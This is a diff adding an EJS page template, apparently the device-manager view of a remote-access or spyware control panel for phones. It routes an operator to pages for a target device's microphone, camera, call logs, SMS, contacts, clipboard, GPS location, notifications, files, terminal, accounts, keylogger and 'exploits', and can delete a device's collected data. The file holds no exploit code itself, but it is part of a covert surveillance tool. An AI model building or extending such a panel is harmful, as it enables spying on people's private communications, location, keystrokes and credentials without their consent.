@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html class="dark">
+<% include partials/head.ejs %>
+<body class="bg-bg-dark min-h-screen">
+    <script>var baseURL = '<%= baseURL %>';</script>
+    <% include partials/header-new.ejs %>
+    <% include partials/sidebar-new.ejs %>
+
+    <!-- Main content -->
+    <div class="ml-56 mt-14 p-6">
+        <!-- Device info header -->
+        <div class="glass rounded-xl p-4 mb-6 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-gradient-to-br from-accent-blue to-accent-purple rounded-lg flex items-center justify-center">
+                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
+                </div>
+                <div>
+                    <h2 class="text-white font-bold text-lg">Device: <code class="text-accent-blue"><%= deviceID %></code></h2>
+                    <p class="text-slate-500 text-sm"><%= page.toUpperCase() %></p>
+                </div>
+            </div>
+            <div class="flex items-center gap-2">
+                <a href="/manage/<%= deviceID %>/info" class="btn-ghost text-xs">Info</a>
+                <button class="btn-danger text-xs" id="deleteDeviceBtn"><i class="icon trash"></i> Delete</button>
+            </div>
+        </div>
+
+        <!-- Page content -->
+        <div class="glass rounded-xl p-6">
+                <%
+                    if(page === "microphone") { %><% include deviceManagerPages/microphone.ejs %><% }
+                    else if(page === "calls") { %><% include deviceManagerPages/call_log.ejs %><% }
+                    else if(page === "clipboard") { %><% include deviceManagerPages/clipboard_log.ejs %><% }
+                    else if(page === "contacts") { %><% include deviceManagerPages/contacts.ejs %><% }
+                    else if(page === "gps" || page === "location") { %><% include deviceManagerPages/gps.ejs %><% }
+                    else if(page === "info") { %><% include deviceManagerPages/info.ejs %><% }
+                    else if(page === "notifications") { %><% include deviceManagerPages/notification_log.ejs %><% }
+                    else if(page === "sms") { %><% include deviceManagerPages/sms_manager.ejs %><% }
+                    else if(page === "wifi") { %><% include deviceManagerPages/wifi_manager.ejs %><% }  
+                    else if(page === "apps") { %><% include deviceManagerPages/apps.ejs %><% }  
+                    else if(page === "permissions") { %><% include deviceManagerPages/permissions.ejs %><% }                    
+                    else if(page === "files") { %><% include deviceManagerPages/file_manager.ejs %><% }
+                    else if(page === "downloads") { %><% include deviceManagerPages/downloads.ejs %><% }
+                    else if(page === "terminal") { %><% include deviceManagerPages/terminal.ejs %><% }
+                    else if(page === "alpine") { %><% include deviceManagerPages/alpine.ejs %><% }
+                    else if(page === "packages") { %><% include deviceManagerPages/packages.ejs %><% }
+                    else if(page === "exploits") { %><% include deviceManagerPages/exploits.ejs %><% }
+                    else if(page === "camera") { %><% include deviceManagerPages/camera.ejs %><% }
+                    else if(page === "keylogger") { %><% include deviceManagerPages/keylogger.ejs %><% }
+                    else if(page === "accounts") { %><% include deviceManagerPages/accounts.ejs %><% }
+                    else if(page === "syssettings") { %><% include deviceManagerPages/system_settings.ejs %><% }
+                    else if(page === "settings") { %><% include deviceManagerPages/settings.ejs %><% }
+                    else if(page === "notFound") { %><% include deviceManagerPages/deviceNotFound.ejs %><% }
+                    else { %><% include deviceManagerPages/noPage.ejs %><% }
+                %>
+        </div>
+    </div>
+
+    <% include partials/aiPanel.ejs %>
+
+    <script>
+        $(document).ready(function() {
+            $('#deleteDeviceBtn').click(function() {
+                if (confirm('Are you sure you want to delete device <%= deviceID %>?\nThis will remove it and all of its data.')) {
+                    var btn = $(this).text('Deleting...').addClass('opacity-50');
+                    $.post('/manage/<%= deviceID %>/delete', function(data) {
+                        if (data.error) showNotification('#f03434', data.error);
+                        else { showNotification('#2ecc71', data.message); setTimeout(function(){ window.location.href = '/'; }, 500); }
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
